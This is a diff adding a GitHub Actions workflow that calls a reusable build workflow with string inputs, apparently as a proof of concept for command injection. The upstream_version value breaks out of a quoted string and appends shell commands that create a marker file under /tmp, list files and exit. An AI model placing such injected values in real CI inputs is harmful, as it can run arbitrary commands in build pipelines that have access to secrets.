@@ -1,0 +1,11 @@
+name: argus-call-2
+on:
+  workflow_dispatch:
+jobs:
+  call:
+    uses: ./.github/workflows/build-core.yml
+    with:
+      version_type: "x"
+      version: "x"
+      upstream_version: "x\"; touch /tmp/pwned_upstream_version; ls; exit 1; #"
+      upstream_sha: ""
